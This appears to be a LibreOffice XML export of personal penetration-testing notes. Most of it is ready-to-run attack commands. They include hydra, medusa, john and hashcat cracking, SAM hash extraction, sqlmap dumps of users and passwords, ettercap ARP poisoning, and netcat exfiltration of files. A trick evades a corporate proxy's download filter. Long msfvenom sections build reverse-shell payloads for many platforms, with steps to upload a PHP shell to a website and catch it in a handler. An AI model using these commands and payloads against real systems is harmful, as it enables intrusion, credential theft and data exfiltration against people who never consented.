            </text:list-item>
          </text:list>
          <text:h text:style-name="Heading_20_2" text:outline-level="2"><text:bookmark text:name="user-content-6-enumeration-by-smb-server-message-block-for-example-cifs"/><text:soft-page-break/>6. Enumeration by SMB (Server Message Block; for example cifs)</text:h>
          <text:list xml:id="list2432926711" text:style-name="L21">
            <text:list-item>
              <text:p text:style-name="P57">Open ports that suggest a presence of that service == 25 </text:p>
            </text:list-item>
            <text:list-item>
              <text:p text:style-name="P21">use metasploit and <text:span text:style-name="Emphasis">auxiliary/scanner/smb/smb_enumusers</text:span> </text:p>
            </text:list-item>
          </text:list>
          <text:h text:style-name="Heading_20_2" text:outline-level="2"><text:bookmark text:name="user-content-7-enumeration-by-ssh-secure-shell"/>7. Enumeration by SSH (Secure Shell)</text:h>
          <text:list xml:id="list1409051974" text:style-name="L22">
            <text:list-item>
              <text:p text:style-name="P58">Open ports that suggest a presence of that service == 22 </text:p>
            </text:list-item>
            <text:list-item>
              <text:p text:style-name="P22">use metasploit and <text:span text:style-name="Emphasis">auxiliary/scanner/ssh/ssh_enumusers</text:span> </text:p>
            </text:list-item>
          </text:list>
          <text:h text:style-name="Heading_20_2" text:outline-level="2"><text:bookmark text:name="user-content-8-web-page-written-in-wordpress-enumeration"/>8. Web page (written in wordpress) enumeration</text:h>
          <text:list xml:id="list184564791" text:style-name="L23">
            <text:list-item>
              <text:p text:style-name="P59">wpscan --url <text:a xlink:type="simple" xlink:href="http://10.0.2.8/beckup-wordpres" text:style-name="Internet_20_link" text:visited-style-name="Visited_20_Internet_20_Link">http://10.0.2.8/beckup-wordpres</text:a> --enumerate p </text:p>
            </text:list-item>
            <text:list-item>
              <text:p text:style-name="P59">where p option is for plugins (more on that after wpscan -h) </text:p>
            </text:list-item>
            <text:list-item>
              <text:p text:style-name="P23">sometime is good idea to add wp_content_dir (more on that in wpscan -h) </text:p>
            </text:list-item>
          </text:list>
        </text:section>
      </text:section>
      <text:h text:style-name="Heading_20_1" text:outline-level="1">4. Command_Steps<text:bookmark text:name="wiki-content2"/></text:h>
      <text:section text:style-name="Sect1" text:name="Sekcja6">
        <text:section text:style-name="Sect1" text:name="Sekcja7">
          <text:h text:style-name="Heading_20_3" text:outline-level="3"><text:bookmark text:name="wiki-body3"/><text:bookmark text:name="user-content-always-check-if-passwords-find-in-one-place-is-valid-in-different-systems-and-application-for-that-user"/><text:span text:style-name="Emphasis">Always check if passwords find in one place is valid in different systems and application for that user</text:span> </text:h>
          <text:p text:style-name="Horizontal_20_Line"/>
          <text:h text:style-name="Heading_20_3" text:outline-level="3"><text:bookmark text:name="user-content-medusa"/>medusa</text:h>
          <text:list xml:id="list1570163831" text:style-name="L24">
            <text:list-item>
              <text:p text:style-name="P60">for brutforce passwords. </text:p>
            </text:list-item>
            <text:list-item>
              <text:p text:style-name="P24">display all modules currently installed </text:p>
            </text:list-item>
          </text:list>
          <text:p text:style-name="Text_20_body"><text:span text:style-name="Emphasis">medusa -d</text:span></text:p>
          <text:list xml:id="list3934033946" text:style-name="L25">
            <text:list-item>
              <text:p text:style-name="P25">display specific options for a given module (in this example smbnt) </text:p>
            </text:list-item>
          </text:list>
          <text:p text:style-name="Text_20_body"><text:span text:style-name="Emphasis">medusa -M smbnt -q</text:span></text:p>
          <text:list xml:id="list3742951195" text:style-name="L26">
            <text:list-item>
              <text:p text:style-name="P26">I can try for example to hack mysql </text:p>
            </text:list-item>
          </text:list>
          <text:p text:style-name="Text_20_body"><text:span text:style-name="Emphasis">medusa -h 192.168.1.120 -u root -p password -e ns -O mysql.medusa.out -M mysql</text:span></text:p>
          <text:h text:style-name="Heading_20_3" text:outline-level="3"><text:bookmark text:name="user-content-hydra"/>hydra</text:h>
          <text:list xml:id="list561083704" text:style-name="L27">
            <text:list-item>
              <text:p text:style-name="P27">also useful and nice for that job </text:p>
            </text:list-item>
          </text:list>
          <text:p text:style-name="Text_20_body"><text:span text:style-name="Emphasis">hydra -L /fileWithUserNames.txt -e ns 192.168.1.25 ssh</text:span><text:line-break/><text:span text:style-name="Emphasis">hydra -L /fileWithUserNames.txt -P /PasswordsList.txt -e ns 192.168.1.25 ssh</text:span></text:p>
          <text:p text:style-name="Text_20_body">-e option allows search not defined (n) and passwords same like user-name (s)</text:p>
          <text:p text:style-name="Horizontal_20_Line"/>
          <text:h text:style-name="Heading_20_3" text:outline-level="3"><text:bookmark text:name="user-content-john"/>john</text:h>
          <text:list xml:id="list990964856" text:style-name="L28">
            <text:list-item>
              <text:p text:style-name="P28">for the shadow files </text:p>
            </text:list-item>
          </text:list>
          <text:p text:style-name="Text_20_body"><text:soft-page-break/><text:span text:style-name="Emphasis">john -wordlist=/path/to/file/with/passwords.txt ~/preperd/shadowFile.txt</text:span></text:p>
          <text:list xml:id="list2048571060" text:style-name="L29">
            <text:list-item>
              <text:p text:style-name="P29">we can use configure file to create more sophisticated word list <text:a xlink:type="simple" xlink:href="http://contest-2010.korelogic.com/rules.html" text:style-name="Internet_20_link" text:visited-style-name="Visited_20_Internet_20_Link">http://contest-2010.korelogic.com/rules.html</text:a><text:line-break/>They can be viewed and added to in the file located at _/etc/john/john.conf under <text:span text:style-name="Emphasis">‘#Wordlist mode rules’</text:span><text:line-break/>To perform modifications according to these rules run the following command </text:p>
            </text:list-item>
          </text:list>
          <text:p text:style-name="Text_20_body"><text:span text:style-name="Emphasis">john -wordlist=rockyou.txt -rules -stdout &gt; rockyouslownikpo.txt</text:span></text:p>
          <text:list xml:id="list2719873779" text:style-name="L30">
            <text:list-item>
              <text:p text:style-name="P61">shadowFile.txt without big changes, removing "empty users" and we are ready to go </text:p>
            </text:list-item>
            <text:list-item>
              <text:p text:style-name="P30">john can be used without wordlist. Then I can use specific format (nt2 is for windows ntlm, lm hashes)<text:line-break/>PS: I can check the format by <text:span text:style-name="Emphasis">john /root/fileWithHAsh.txt</text:span> </text:p>
            </text:list-item>
          </text:list>
          <text:p text:style-name="Text_20_body"><text:span text:style-name="Emphasis">john /root/fileWithHAsh.txt -format=nt2 -users=userName -show</text:span></text:p>
          <text:list xml:id="list3371983824" text:style-name="L31">
            <text:list-item>
              <text:p text:style-name="P31">and I can use a brute force without a dictionary </text:p>
            </text:list-item>
          </text:list>
          <text:p text:style-name="Text_20_body"><text:span text:style-name="Emphasis">john -incremental:lanman /root/fileWithHAsh.txt</text:span></text:p>
          <text:p text:style-name="Text_20_body">lanman – Letters, numbers, and some special characters.<text:line-break/>alpha – Letters only.<text:line-break/>digits – Numbers only.<text:line-break/>all – All possible characters.</text:p>
          <text:list xml:id="list2216956653" text:style-name="L32">
            <text:list-item>
              <text:p text:style-name="P32">I can also store a session and back to it atelier </text:p>
            </text:list-item>
          </text:list>
          <text:p text:style-name="Text_20_body"><text:span text:style-name="Emphasis">john -incremental:lanman /root/fileWithHAsh.txt -session=nameOfSesion</text:span><text:line-break/>restore by<text:line-break/><text:span text:style-name="Emphasis">john -restore=nameOfSesion</text:span></text:p>
          <text:h text:style-name="Heading_20_3" text:outline-level="3"><text:bookmark text:name="user-content-hashcat"/>hashcat</text:h>
          <text:list xml:id="list1342958534" text:style-name="L33">
            <text:list-item>
              <text:p text:style-name="P33">great like john </text:p>
            </text:list-item>
          </text:list>
          <text:p text:style-name="Text_20_body"><text:span text:style-name="Emphasis">hashcat -a 0 -m 500 hash.txt wordlist.txt</text:span></text:p>
          <text:p text:style-name="Text_20_body">-a == attack mode and 0 = straight (more in man)<text:line-break/>-m == hash type and 500 = md5crypt, MD5(Unix), FreeBSD MD5, Cisco-IOS MD5 (much more in man)</text:p>
          <text:list xml:id="list32515610" text:style-name="L34">
            <text:list-item>
              <text:p text:style-name="P34">hash.txt is modified shadow file (remove "empty users", remove users name, remove last sings (only HASH)) </text:p>
            </text:list-item>
          </text:list>
          <text:p text:style-name="Horizontal_20_Line"/>
          <text:h text:style-name="Heading_20_3" text:outline-level="3"><text:bookmark text:name="user-content-strings"/>strings</text:h>
          <text:list xml:id="list3766861509" text:style-name="L35">
            <text:list-item>
              <text:p text:style-name="P35">great command to pull string out of core files and many more </text:p>
            </text:list-item>
          </text:list>
          <text:p text:style-name="Horizontal_20_Line"/>
          <text:h text:style-name="Heading_20_3" text:outline-level="3"><text:bookmark text:name="user-content-nfs-network-file-shares"/><text:soft-page-break/>NFS (Network File Shares)</text:h>
          <text:list xml:id="list2300493760" text:style-name="L36">
            <text:list-item>
              <text:p text:style-name="P62">I can check if I can mount some shares in a target system (in metasploit)<text:line-break/><text:span text:style-name="Emphasis">use auxiliary/scanner/nfs/nfsmount</text:span> </text:p>
            </text:list-item>
            <text:list-item>
              <text:p text:style-name="P36">After that I know if I can mount something simple like that<text:line-break/><text:span text:style-name="Emphasis">mkdir /tmp/metasploitable</text:span><text:line-break/><text:span text:style-name="Emphasis">mount -o nolock -t nfs 10.10.10.125:/ /tmp/metasploitable</text:span> </text:p>
            </text:list-item>
          </text:list>
          <text:p text:style-name="Text_20_body">PS.<text:line-break/>10.10.10.125:/ ==&gt; is a "/" directory on a target "10.10.10.125"</text:p>
          <text:p text:style-name="Horizontal_20_Line"/>
          <text:h text:style-name="Heading_20_3" text:outline-level="3"><text:bookmark text:name="user-content-vnc-virtual-network-computing"/>VNC (Virtual Network Computing)</text:h>
          <text:list xml:id="list2034075603" text:style-name="L37">
            <text:list-item>
              <text:p text:style-name="P37">remote access to the target. I can check if it is possible to use vnc without any credentials (like always matasploit is the best)<text:line-break/><text:span text:style-name="Emphasis">use auxiliary/scanner/vnc/vnc_none_auth</text:span></text:p>
            </text:list-item>
            <text:list-item>
              <text:p text:style-name="P37">if I got credentials I may use it as well with the above exploit</text:p>
            </text:list-item>
          </text:list>
          <text:p text:style-name="Horizontal_20_Line"/>
          <text:h text:style-name="Heading_20_3" text:outline-level="3"><text:bookmark text:name="user-content-windows"/>Windows</text:h>
          <text:list xml:id="list874510413" text:style-name="L38">
            <text:list-item>
              <text:p text:style-name="P63">getting <text:span text:style-name="Emphasis">system</text:span> and a <text:span text:style-name="Emphasis">sam</text:span> file </text:p>
            </text:list-item>
            <text:list-item>
              <text:p text:style-name="P63">both file contain a hashes for crack. They are located in Windows/System32/Config </text:p>
            </text:list-item>
            <text:list-item>
              <text:p text:style-name="P63">Bkhive and samdump2 work together to extract Windows password hashes from the SAM and SYSTEM files. </text:p>
            </text:list-item>
            <text:list-item>
              <text:p text:style-name="P63">for get <text:span text:style-name="Emphasis">system</text:span> file:<text:line-break/><text:span text:style-name="Emphasis">bkhive system /root/fileToPutHiveResults.txt</text:span> </text:p>
            </text:list-item>
            <text:list-item>
              <text:p text:style-name="P38">for get <text:span text:style-name="Emphasis">sam</text:span> file:<text:line-break/><text:span text:style-name="Emphasis">samdump2 SAM /root/fileToPutHiveResults.txt &gt; /root/hash.txt</text:span> </text:p>
            </text:list-item>
          </text:list>
          <text:p text:style-name="Horizontal_20_Line"/>
          <text:h text:style-name="Heading_20_3" text:outline-level="3"><text:bookmark text:name="user-content-sqlmap"/>sqlmap</text:h>
          <text:list xml:id="list1999007057" text:style-name="L39">
            <text:list-item>
              <text:p text:style-name="P64">sqlmap is an open source penetration testing tool that automates the process of detecting and exploiting SQL injection flaws and taking over of database servers. </text:p>
            </text:list-item>
            <text:list-item>
              <text:p text:style-name="P64">example show web page witch potential sql with checking if current user is administrator and check current database<text:line-break/><text:span text:style-name="Emphasis">sqlmap -u </text:span><text:a xlink:type="simple" xlink:href="http://192.168.1.120/products.php?id=1" text:style-name="Internet_20_link" text:visited-style-name="Visited_20_Internet_20_Link"><text:span text:style-name="Emphasis">http://192.168.1.120/products.php?id=1</text:span></text:a><text:span text:style-name="Emphasis"> --current-user --is-dba --current-db</text:span> </text:p>
            </text:list-item>
            <text:list-item>
              <text:p text:style-name="P39">example 2 take users names and their passwords<text:line-break/><text:span text:style-name="Emphasis">sqlmap -u </text:span><text:a xlink:type="simple" xlink:href="http://192.168.1.120/products.php?id=1" text:style-name="Internet_20_link" text:visited-style-name="Visited_20_Internet_20_Link"><text:span text:style-name="Emphasis">http://192.168.1.120/products.php?id=1</text:span></text:a><text:span text:style-name="Emphasis"> --users --passwords</text:span> </text:p>
            </text:list-item>
          </text:list>
          <text:h text:style-name="Heading_20_3" text:outline-level="3"><text:bookmark text:name="user-content-setoolkit"/>setoolkit</text:h>
          <text:list xml:id="list3728386273" text:style-name="L40">
            <text:list-item>
              <text:p text:style-name="P40">For use of ready to go trojans </text:p>
            </text:list-item>
          </text:list>
          <text:h text:style-name="Heading_20_3" text:outline-level="3"><text:bookmark text:name="user-content-msfvenom"/>msfvenom</text:h>
          <text:list xml:id="list989591134" text:style-name="L41">
            <text:list-item>
              <text:p text:style-name="P65">For creating your own trojans with default settings </text:p>
            </text:list-item>
            <text:list-item>
              <text:p text:style-name="P41"><text:soft-page-break/>It is fun thing. I can use it for example to create php payload. Steps to do are: </text:p>
            </text:list-item>
          </text:list>
          <text:list xml:id="list3445161848" text:style-name="L42">
            <text:list-item>
              <text:p text:style-name="P66">Creating a payload<text:line-break/><text:span text:style-name="Emphasis">msfvenom -p php/meterpreter/reverse_tcp LHOST=10.0.2.15 LPOTR=6000 -e php/base64 -f raw &gt; exploit.php</text:span><text:line-break/>With -f i can precise format (i could use .exe for example if i don`t whant to use php exploit).<text:line-break/>The ip 10.0.2.15 is the attacker address. </text:p>
            </text:list-item>
            <text:list-item>
              <text:p text:style-name="P66">Add to exploit.php == <text:span text:style-name="Emphasis">&lt;?php</text:span> in the begining of the file and <text:span text:style-name="Emphasis">?&gt;</text:span> to the end </text:p>
            </text:list-item>
            <text:list-item>
              <text:p text:style-name="P66">Upload that payload to the web page </text:p>
            </text:list-item>
            <text:list-item>
              <text:p text:style-name="P66">use exploit/multi/handler on msfconsole </text:p>
            </text:list-item>
            <text:list-item>
              <text:p text:style-name="P66">Set LHOST and LPOTR like in peyload (attacker ip and listening port) </text:p>
            </text:list-item>
            <text:list-item>
              <text:p text:style-name="P66">exploit </text:p>
            </text:list-item>
            <text:list-item>
              <text:p text:style-name="P66">go to the uploaded file <text:a xlink:type="simple" xlink:href="http://www.lol.pl/uploadfiles/exploit.php" text:style-name="Internet_20_link" text:visited-style-name="Visited_20_Internet_20_Link"><text:span text:style-name="Emphasis">www.lol.pl/uploadfiles/exploit.php</text:span></text:a> </text:p>
            </text:list-item>
            <text:list-item>
              <text:p text:style-name="P42">That is it. I got meterpreter console on metasploit :) </text:p>
            </text:list-item>
          </text:list>
        </text:section>
      </text:section>
      <text:h text:style-name="Heading_20_1" text:outline-level="1">5. Can I ?<text:bookmark text:name="wiki-content3"/></text:h>
      <text:section text:style-name="Sect1" text:name="Sekcja8">
        <text:section text:style-name="Sect1" text:name="Sekcja9">
          <text:h text:style-name="Heading_20_2" text:outline-level="2"><text:bookmark text:name="wiki-body4"/><text:bookmark text:name="user-content-1-arp-poison-sniffing"/>1. Arp Poison (Sniffing)</text:h>
          <text:list xml:id="list3640815758" text:style-name="L43">
            <text:list-item>
              <text:p text:style-name="P67">direct all communication from target to attacker system:<text:line-break/><text:span text:style-name="Emphasis">etercap -T -M arp:oneway /192.168.1.100/</text:span> </text:p>
            </text:list-item>
            <text:list-item>
              <text:p text:style-name="P67">for more, I can use programs like "Dsnif" or "Cain and Able" </text:p>
            </text:list-item>
            <text:list-item>
              <text:p text:style-name="P43">etercap is also good for dns spoof (it is possible to use a graphical interface etercap) </text:p>
            </text:list-item>
          </text:list>
        </text:section>
      </text:section>
      <text:h text:style-name="Heading_20_1" text:outline-level="1">XDirs<text:bookmark text:name="wiki-content4"/></text:h>
      <text:section text:style-name="Sect1" text:name="Sekcja10">
        <text:section text:style-name="Sect1" text:name="Sekcja11">
          <text:p text:style-name="Quotations"><text:bookmark text:name="wiki-body5"/>/usr/share/wordlists</text:p>
          <text:p text:style-name="Quotations">/etc/rc.d</text:p>
          <text:p text:style-name="Quotations">/var/log</text:p>
          <text:p text:style-name="Quotations">/etc/nologin</text:p>
          <text:p text:style-name="Quotations">/etc/fstab</text:p>
          <text:p text:style-name="Quotations">/var/spool/mail</text:p>
          <text:p text:style-name="Quotations">/etc/securetty</text:p>
          <text:p text:style-name="Quotations">/var/mail "standard for fetchmail"</text:p>
          <text:p text:style-name="Quotations">/var/tmp</text:p>
          <text:p text:style-name="Quotations">/proc "many things from that == process information pseudo-file system"</text:p>
          <text:p text:style-name="Quotations">/dev/null "trash conteiner for many crontab tasks"</text:p>
        </text:section>
      </text:section>
      <text:h text:style-name="Heading_20_1" text:outline-level="1"><text:soft-page-break/>XFile_transer_by_Netcat<text:bookmark text:name="wiki-content5"/></text:h>
      <text:section text:style-name="Sect1" text:name="Sekcja12">
        <text:section text:style-name="Sect1" text:name="Sekcja13">
          <text:p text:style-name="Quotations"><text:bookmark text:name="wiki-body6"/><text:span text:style-name="Strong_20_Emphasis">Create a listener on Mine machine and pipe the traffic from the input into a file</text:span></text:p>
          <text:p text:style-name="Quotations">nc -lvvp 4444 &gt; file_to_download.txt</text:p>
          <text:p text:style-name="Quotations">-l == State that we are going to be listening<text:line-break/>-vv == Show extra verbosity<text:line-break/>-p == We are going to supply a port for listening<text:line-break/>4444 == This is the port will be listening on</text:p>
          <text:p text:style-name="Quotations"><text:span text:style-name="Strong_20_Emphasis">Back on the ssh session of the target machine we are going to transfer the file through netcat to the listening port on our local machine</text:span></text:p>
          <text:p text:style-name="Quotations">nc -nvv 192.168.1.141 4444 &lt; file_to_download.txt</text:p>
          <text:p text:style-name="Quotations">-n == do not resolve IP address using DNS</text:p>
          <text:p text:style-name="Quotations"><text:span text:style-name="Strong_20_Emphasis">Be aware that netcat will not tell you once the file has finished transferring. It is a good idea to open another shell and do ls -ls salary_dec2004.csv.enc to check when the file has stopped increasing in size.</text:span></text:p>
        </text:section>
      </text:section>
      <text:h text:style-name="Heading_20_1" text:outline-level="1">XHow to download ".exe", ".gz" and ".zip" when they blocked<text:bookmark text:name="wiki-content6"/></text:h>
      <text:section text:style-name="Sect1" text:name="Sekcja14">
        <text:section text:style-name="Sect1" text:name="Sekcja15">
          <text:p text:style-name="Text_20_body"><text:bookmark text:name="wiki-body7"/>Fortunately, most proxy administrators can not write regular expressions very well. At one site I know (let's call them BigAcme corporation), the proxies check for URL that end in the well known extensions ".exe", ".gz" and ".zip". Nobody cared to inform the proxy admins that bzip2 exists, so downloading ".bz2" files is allowed... :-). Furthermore, since URLs are allowed to contain a "query string" (for passing in form field values through an HTTP GET), adding a "?x" to a download URL fools the regular expression filters but does not destroy the validity of the URL. More often than not, the server on the other side processes the query string and then happily ignores it. I have downloaded many a vendor patch and open source product that way.</text:p>
        </text:section>
      </text:section>
      <text:h text:style-name="Heading_20_1" text:outline-level="1">XMonitoringMySystem<text:bookmark text:name="wiki-content7"/></text:h>
      <text:section text:style-name="Sect1" text:name="Sekcja16">
        <text:section text:style-name="Sect1" text:name="Sekcja17">
          <text:h text:style-name="Heading_20_3" text:outline-level="3"><text:bookmark text:name="wiki-body8"/><text:bookmark text:name="user-content-tcpview-windows"/>TCPView (Windows)</text:h>
          <text:list xml:id="list887460219" text:style-name="L44">
            <text:list-item>
              <text:p text:style-name="P44">TCPView is a Windows program that will show you detailed listings of all TCP and UDP endpoints on your system, including the local and remote addresses and state of TCP connections. On Windows Server 2008, Vista, and XP, TCPView also reports the name of the process that owns the endpoint. TCPView provides a more informative and conveniently presented subset of the Netstat program that ships with Windows. The TCPView download includes Tcpvcon, a command-line version with the same functionality.</text:p>
            </text:list-item>
            <text:list-item>
              <text:p text:style-name="P44">on Linux i can use Wireshark</text:p>
            </text:list-item>
          </text:list>
          <text:h text:style-name="Heading_20_3" text:outline-level="3"><text:bookmark text:name="user-content-autoruns-for-windows"/><text:soft-page-break/>Autoruns for Windows</text:h>
          <text:list xml:id="list3346724807" text:style-name="L45">
            <text:list-item>
              <text:p text:style-name="P45">This utility, which has the most comprehensive knowledge of auto-starting locations of any startup monitor, shows you what programs are configured to run during system bootup or login, and when you start various built-in Windows applications like Internet Explorer, Explorer and media players. These programs and drivers include ones in your startup folder, Run, RunOnce, and other Registry keys. Autoruns reports Explorer shell extensions, toolbars, browser helper objects, Winlogon notifications, auto-start services, and much more. Autoruns goes way beyond other autostart utilities.</text:p>
            </text:list-item>
            <text:list-item>
              <text:p text:style-name="P45">Autoruns' Hide Signed Microsoft Entries option helps you to zoom in on third-party auto-starting images that have been added to your system and it has support for looking at the auto-starting images configured for other accounts configured on a system. Also included in the download package is a command-line equivalent that can output in CSV format, Autorunsc.</text:p>
            </text:list-item>
            <text:list-item>
              <text:p text:style-name="P45">on Linux:<text:line-break/>1. ps aux | less<text:line-break/>2. top ==&gt; h for help<text:line-break/>3. pstree ==&gt; shows running processes as a tree<text:line-break/>4. ps -eM ==&gt; get security info<text:line-break/>5. atop and htop also are weary useful tools</text:p>
            </text:list-item>
          </text:list>
          <text:h text:style-name="Heading_20_3" text:outline-level="3"><text:bookmark text:name="user-content-driverview-windows"/>DriverView (Windows)</text:h>
          <text:list xml:id="list2425198197" text:style-name="L46">
            <text:list-item>
              <text:p text:style-name="P46">DriverView utility displays the list of all device drivers currently loaded on your system. For each driver in the list, additional useful information is displayed: load address of the driver, description, version, product name, company that created the driver, and more.</text:p>
            </text:list-item>
            <text:list-item>
              <text:p text:style-name="P46">for Linux i can use great tool like "inxi" (use -F for full information, in man is match more information about it)</text:p>
            </text:list-item>
          </text:list>
          <text:h text:style-name="Heading_20_3" text:outline-level="3"><text:bookmark text:name="user-content-system-file-checker-windows"/>System File Checker (Windows)</text:h>
          <text:list xml:id="list1990505703" text:style-name="L47">
            <text:list-item>
              <text:p text:style-name="P47">repair missing or corrupted system files</text:p>
            </text:list-item>
            <text:list-item>
              <text:p text:style-name="P47">it is preinstalled on new Windows<text:line-break/>for help ==&gt; <text:span text:style-name="Emphasis">sfc /?</text:span><text:line-break/>for scan ==&gt; <text:span text:style-name="Emphasis">sfc /scannow</text:span></text:p>
            </text:list-item>
            <text:list-item>
              <text:p text:style-name="P47">for Linux "Tripwire open source". It is much more then checker because it is a free IDS system</text:p>
            </text:list-item>
          </text:list>
        </text:section>
      </text:section>
      <text:h text:style-name="Heading_20_1" text:outline-level="1">XMore on msfvenom<text:bookmark text:name="wiki-content8"/></text:h>
      <text:section text:style-name="Sect1" text:name="Sekcja18">
        <text:section text:style-name="Sect1" text:name="Sekcja19">
          <text:p text:style-name="Text_20_body"><text:bookmark text:name="wiki-body9"/>Often one of the most useful (and to the beginner underrated) abilities of Metasploit is the msfpayload module. Multiple payloads can be created with this module and it helps something that can give you a shell in almost any situation. For each of these payloads you can go into msfconsole and select exploit/multi/handler. Run ‘set payload’ for the relevant payload used and configure all necessary options (LHOST, LPORT, etc). Execute and wait for the payload to be run. For the <text:soft-page-break/>examples below it’s pretty self explanatory but LHOST should be filled in with your IP address (LAN IP if attacking within the network, WAN IP if attacking across the internet), and LPORT should be the port you wish to be connected back on.</text:p>
          <text:h text:style-name="Heading_20_2" text:outline-level="2"><text:bookmark text:name="user-content-list-payloads"/>List payloads</text:h>
          <text:p text:style-name="Text_20_body">msfvenom -l</text:p>
          <text:h text:style-name="Heading_20_2" text:outline-level="2"><text:bookmark text:name="user-content-binaries"/>Binaries</text:h>
          <text:h text:style-name="Heading_20_3" text:outline-level="3"><text:bookmark text:name="user-content-linux"/>Linux</text:h>
          <text:p text:style-name="Text_20_body">msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST=&lt;Your IP Address&gt; LPORT=&lt;Your Port to Connect On&gt; -f elf &gt; shell.elf</text:p>
          <text:h text:style-name="Heading_20_3" text:outline-level="3"><text:bookmark text:name="user-content-windows1"/>Windows</text:h>
          <text:p text:style-name="Text_20_body">msfvenom -p windows/meterpreter/reverse_tcp LHOST=&lt;Your IP Address&gt; LPORT=&lt;Your Port to Connect On&gt; -f exe &gt; shell.exe</text:p>
          <text:h text:style-name="Heading_20_3" text:outline-level="3"><text:bookmark text:name="user-content-mac"/>Mac</text:h>
          <text:p text:style-name="Text_20_body">msfvenom -p osx/x86/shell_reverse_tcp LHOST=&lt;Your IP Address&gt; LPORT=&lt;Your Port to Connect On&gt; -f macho &gt; shell.macho</text:p>
          <text:h text:style-name="Heading_20_2" text:outline-level="2"><text:bookmark text:name="user-content-web-payloads"/>Web Payloads</text:h>
          <text:h text:style-name="Heading_20_3" text:outline-level="3"><text:bookmark text:name="user-content-php"/>PHP</text:h>
          <text:p text:style-name="Text_20_body">msfvenom -p php/meterpreter_reverse_tcp LHOST=&lt;Your IP Address&gt; LPORT=&lt;Your Port to Connect On&gt; -f raw &gt; shell.php cat shell.php | pbcopy &amp;&amp; echo '&lt;?php ' | tr -d '\n' &gt; shell.php &amp;&amp; pbpaste &gt;&gt; shell.php</text:p>
          <text:h text:style-name="Heading_20_3" text:outline-level="3"><text:bookmark text:name="user-content-asp"/>ASP</text:h>
          <text:p text:style-name="Text_20_body">msfvenom -p windows/meterpreter/reverse_tcp LHOST=&lt;Your IP Address&gt; LPORT=&lt;Your Port to Connect On&gt; -f asp &gt; shell.asp</text:p>
          <text:h text:style-name="Heading_20_3" text:outline-level="3"><text:bookmark text:name="user-content-jsp"/>JSP</text:h>
          <text:p text:style-name="Text_20_body">msfvenom -p java/jsp_shell_reverse_tcp LHOST=&lt;Your IP Address&gt; LPORT=&lt;Your Port to Connect On&gt; -f raw &gt; shell.jsp</text:p>
          <text:h text:style-name="Heading_20_3" text:outline-level="3"><text:bookmark text:name="user-content-war"/>WAR</text:h>
          <text:p text:style-name="Text_20_body">msfvenom -p java/jsp_shell_reverse_tcp LHOST=&lt;Your IP Address&gt; LPORT=&lt;Your Port to Connect On&gt; -f war &gt; shell.war</text:p>
          <text:h text:style-name="Heading_20_2" text:outline-level="2"><text:bookmark text:name="user-content-scripting-payloads"/><text:soft-page-break/>Scripting Payloads</text:h>
          <text:h text:style-name="Heading_20_3" text:outline-level="3"><text:bookmark text:name="user-content-python"/>Python</text:h>
          <text:p text:style-name="Text_20_body">msfvenom -p cmd/unix/reverse_python LHOST=&lt;Your IP Address&gt; LPORT=&lt;Your Port to Connect On&gt; -f raw &gt; shell.py</text:p>
          <text:h text:style-name="Heading_20_3" text:outline-level="3"><text:bookmark text:name="user-content-bash"/>Bash</text:h>
          <text:p text:style-name="Text_20_body">msfvenom -p cmd/unix/reverse_bash LHOST=&lt;Your IP Address&gt; LPORT=&lt;Your Port to Connect On&gt; -f raw &gt; shell.sh</text:p>
          <text:h text:style-name="Heading_20_3" text:outline-level="3"><text:bookmark text:name="user-content-perl"/>Perl</text:h>
          <text:p text:style-name="Text_20_body">msfvenom -p cmd/unix/reverse_perl LHOST=&lt;Your IP Address&gt; LPORT=&lt;Your Port to Connect On&gt; -f raw &gt; shell.pl</text:p>
          <text:h text:style-name="Heading_20_2" text:outline-level="2"><text:bookmark text:name="user-content-shellcode"/>Shellcode</text:h>
          <text:p text:style-name="Text_20_body">For all shellcode see ‘msfvenom –help-formats’ for information as to valid parameters. Msfvenom will output code that is able to be cut and pasted in this language for your exploits.</text:p>
          <text:h text:style-name="Heading_20_3" text:outline-level="3"><text:bookmark text:name="user-content-linux-based-shellcode"/>Linux Based Shellcode</text:h>
          <text:p text:style-name="Text_20_body">msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST=&lt;Your IP Address&gt; LPORT=&lt;Your Port to Connect On&gt; -f &lt;language&gt;</text:p>
          <text:h text:style-name="Heading_20_3" text:outline-level="3"><text:bookmark text:name="user-content-windows-based-shellcode"/>Windows Based Shellcode</text:h>
          <text:p text:style-name="Text_20_body">msfvenom -p windows/meterpreter/reverse_tcp LHOST=&lt;Your IP Address&gt; LPORT=&lt;Your Port to Connect On&gt; -f &lt;language&gt;</text:p>
          <text:h text:style-name="Heading_20_3" text:outline-level="3"><text:bookmark text:name="user-content-mac-based-shellcode"/>Mac Based Shellcode</text:h>
          <text:p text:style-name="Text_20_body">msfvenom -p osx/x86/shell_reverse_tcp LHOST=&lt;Your IP Address&gt; LPORT=&lt;Your Port to Connect On&gt; -f &lt;language&gt; Handlers</text:p>
          <text:h text:style-name="Heading_20_2" text:outline-level="2"><text:bookmark text:name="user-content-metasploit-handlers-can-be-great-at-quickly-setting-up-metasploit-to-be-in-a-position-to-receive-your-incoming-shells-handlers-should-be-in-the-following-format"/>Metasploit handlers can be great at quickly setting up Metasploit to be in a position to receive your incoming shells. Handlers should be in the following format.</text:h>
          <text:p text:style-name="Text_20_body">use exploit/multi/handler<text:line-break/>set PAYLOAD &lt;Payload name&gt;<text:line-break/>set LHOST &lt;LHOST value&gt;<text:line-break/>set LPORT &lt;LPORT value&gt;<text:line-break/>set ExitOnSession false<text:line-break/>exploit -j -z<text:line-break/>Once the required values are completed the following command will execute your handler – ‘msfconsole -L -r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21:12:52.431999344</meta:creation-date>
    <meta:generator>LibreOffice/6.0.6.2$Linux_X86_64 LibreOffice_project/00m0$Build-2</meta:generator>
    <dc:date>2018-10-01T21:33:59.542050483</dc:date>
    <meta:editing-duration>PT21M9S</meta:editing-duration>
    <meta:editing-cycles>4</meta:editing-cycles>
    <meta:document-statistic meta:table-count="0" meta:image-count="0" meta:object-count="0" meta:page-count="14" meta:paragraph-count="266" meta:word-count="3700" meta:character-count="23251" meta:non-whitespace-character-count="19849"/>
  </office:meta>
</office:document-meta>
</file>